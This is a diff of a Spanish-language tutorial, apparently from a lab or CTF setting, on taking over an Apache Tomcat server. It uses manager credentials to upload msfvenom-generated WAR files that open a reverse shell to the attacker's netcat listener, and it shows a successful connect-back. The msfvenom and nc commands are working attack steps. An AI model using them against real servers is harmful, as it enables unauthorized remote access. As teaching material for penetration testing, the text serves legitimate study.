@@ -45,29 +45,36 @@ For example, to add the manager-gui role to a user named tomcat with a password 
     <user username="tomcat" password="s3cr3t" roles="manager-gui"/>
 ```
 Bien, ya sabiendo el usuario y la contraseña, hacemos login, vamos al panel de administracion de Tomcat y nos ubicamos en la zona donde pone "WAR file to deploy", donde podremos subir archivos maliciosos en formato ".war" para poder ganar acceso a dicha maquina victima.
+
 ¿Y como creo un archivo malicioso? EXACTO !!! Con MSFVENOM !!!
 ```
 msfvenom -p java/shell_reverse_tcp LHOST=IPMAQUINAATACANTE LPORT=PUERTOMAQUINAATACANTE -f war -o NOMBREARCHIVOQUEQUERAMOS.war
             
 	-p java/shell_reverse_tcp = ponemos el payload reverse shell de JAVA debido a que los archivos ".war" funcionan con JAVA
 ```
- Una vez tengamos el archivo, lo subiremos y probaremos si funciona. ¿Por que digo probaremos si funciona? Porque lo normal es que lo haga, pero muchas veces, y dependiendo de como este hecho el servidor puede funcionar o no. Para ello, vamos a ver dos opciones (bueno, en realidad 2 Payloads diferentes):
+ Una vez tengamos el archivo, lo subiremos y probaremos si funciona. ¿Por que digo probaremos si funciona?
+ 
+ Porque lo normal es que lo haga, pero muchas veces, y dependiendo de como este hecho el servidor puede funcionar o no.
+ 
+ Para ello, vamos a ver dos opciones (bueno, en realidad 2 Payloads diferentes):d
 ```
 1) msfvenom -p java/shell_reverse_tcp LHOST=192.168.1.150 LPORT=443 -f war -o reverse1.war
 
 2) msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.150 LPORT=443 -f war -o reverse2.war
 ```
 Como he dicho antes, esto depende de come este configurado el servidor Tomcat, por lo que asi nos aseguramos que alguno de los dos funcione.
+
 Ahora subimos los dos y nos apareceran en la pantalla de control del Tomcat Web Manager App:
 ```
 /reverse1 	None specified 	  	true 	0 	 Start with idle ≥  minutes 
 /reverse2 	None specified 	  	true 	0 	 Start with idle ≥  minutes 
-ddddddddddddddd```
+```
 Perfecto, ya tenemos los dos archivos subidos. Lo siguiente, COMO SIEMPRE, es ponernos a la escucha con NETCAT usando el comando:
 ```
 nc -nlvp 443
 ```
 y ejecutar los archivos uno por uno para ver cual de los dos funciona (o los 2 :P)
+
 Ejecutado el primero, ya vemo que SI funciona:
 ```
 connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 36530  
